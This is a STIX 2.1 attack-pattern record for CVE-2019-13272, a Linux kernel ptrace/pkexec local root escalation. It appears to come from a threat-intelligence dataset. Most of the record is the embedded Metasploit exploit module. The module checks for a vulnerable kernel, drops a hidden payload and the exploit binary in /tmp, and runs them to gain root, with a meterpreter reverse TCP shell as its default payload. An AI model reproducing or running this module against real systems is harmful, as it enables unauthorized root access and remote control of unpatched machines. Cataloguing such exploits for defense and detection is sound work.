{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1526bc12-dc80-4de0-9b04-f41871c6150c",
    "created": "2024-08-14T16:58:32.052195Z",
    "modified": "2024-08-14T16:58:32.052199Z",
    "name": "Linux Polkit pkexec helper PTRACE_TRACEME local root exploit",
    "description": " This module exploits an issue in ptrace_link in kernel/ptrace.c before Linux kernel 5.1.17. This issue can be exploited from a Linux desktop terminal, but not over an SSH session, as it requires execution from within the context of a user with an active Polkit agent. In the Linux kernel before 5.1.17, ptrace_link in kernel/ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship, which allows local users to obtain root access by leveraging certain scenarios with a parent-child process relationship, where a parent drops privileges and calls execve (potentially allowing control by an attacker). One contributing factor is an object lifetime issue (which can also cause a panic). Another contributing factor is incorrect marking of a ptrace relationship as privileged, which is exploitable through (for example) Polkit's pkexec helper with PTRACE_TRACEME.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/ptrace_traceme_pkexec_helper.rb",
            "external_id": "ptrace_traceme_pkexec_helper.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-13272"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bcoles/kernel-exploits/tree/master/CVE-2019-13272"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/project-zero/issues/detail?id=1903"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Compile\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Linux Polkit pkexec helper PTRACE_TRACEME local root exploit',\n      'Description'   => %q{\n          This module exploits an issue in ptrace_link in kernel/ptrace.c before Linux\n          kernel 5.1.17. This issue can be exploited from a Linux desktop terminal, but\n          not over an SSH session, as it requires execution from within the context of\n          a user with an active Polkit agent.\n          In the Linux kernel before 5.1.17, ptrace_link in kernel/ptrace.c mishandles\n          the recording of the credentials of a process that wants to create a ptrace\n          relationship, which allows local users to obtain root access by leveraging\n          certain scenarios with a parent-child process relationship, where a parent drops\n          privileges and calls execve (potentially allowing control by an attacker). One\n          contributing factor is an object lifetime issue (which can also cause a panic).\n          Another contributing factor is incorrect marking of a ptrace relationship as\n          privileged, which is exploitable through (for example) Polkit's pkexec helper\n          with PTRACE_TRACEME.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        => [\n          'Jann Horn',    # Discovery and exploit\n          'bcoles',       # Metasploit module\n          'timwr',        # Metasploit module\n      ],\n      'References'     => [\n          ['CVE', '2019-13272'],\n          ['EDB', '47133'],\n          ['PACKETSTORM', '153663'],\n          ['URL', 'https://github.com/bcoles/kernel-exploits/tree/master/CVE-2019-13272'],\n          ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1903'],\n      ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X64 ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'DefaultOptions' =>\n        {\n          'Payload'     => 'linux/x64/meterpreter/reverse_tcp',\n          'PrependFork' => true,\n        },\n      'Notes'          =>\n        {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability'   => [ CRASH_SAFE ]\n        },\n      'DisclosureDate' => '2019-07-04'))\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def check\n    # Introduced in 4.10, but also backported\n    # Patched in 4.4.185, 4.9.185, 4.14.133, 4.19.58, 5.1.17\n    release = kernel_release\n    v = Rex::Version.new release.split('-').first\n\n    if v >= Rex::Version.new('5.1.17') || v < Rex::Version.new('3')\n      vprint_error \"Kernel version #{release} is not vulnerable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"Kernel version #{release} appears to be vulnerable\"\n\n    unless command_exists? 'pkexec'\n      vprint_error 'pkexec is not installed'\n      return CheckCode::Safe\n    end\n    vprint_good 'pkexec is installed'\n\n    arch = kernel_hardware\n    unless arch.include? 'x86_64'\n      vprint_error \"System architecture #{arch} is not supported\"\n      return CheckCode::Safe\n    end\n    vprint_good \"System architecture #{arch} is supported\"\n\n    loginctl_output = cmd_exec('loginctl --no-ask-password show-session \"$XDG_SESSION_ID\" | grep Remote')\n    if loginctl_output =~ /Remote=yes/\n      print_warning 'This exploit requires a valid policykit session (it cannot be executed over ssh)'\n      return CheckCode::Safe\n    end\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? datastore['WritableDir']\n      fail_with Failure::BadConfig, \"#{datastore['WritableDir']} is not writable\"\n    end\n\n    payload_file = \"#{datastore['WritableDir']}/.#{Rex::Text.rand_text_alpha_lower(6..12)}\"\n    upload_and_chmodx(payload_file, generate_payload_exe)\n    register_file_for_cleanup(payload_file)\n\n    exploit_file = \"#{datastore['WritableDir']}/.#{Rex::Text.rand_text_alpha_lower(6..12)}\"\n    if live_compile?\n      vprint_status 'Live compiling exploit on system...'\n      upload_and_compile exploit_file, exploit_data('CVE-2019-13272', 'poc.c')\n    else\n      vprint_status 'Dropping pre-compiled exploit on system...'\n      upload_and_chmodx exploit_file, exploit_data('CVE-2019-13272', 'exploit')\n    end\n    register_file_for_cleanup(exploit_file)\n\n    print_status(\"Executing exploit '#{exploit_file}'\")\n    result = cmd_exec(\"echo #{payload_file} | #{exploit_file}\")\n    print_status(\"Exploit result:\\n#{result}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-07-04",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}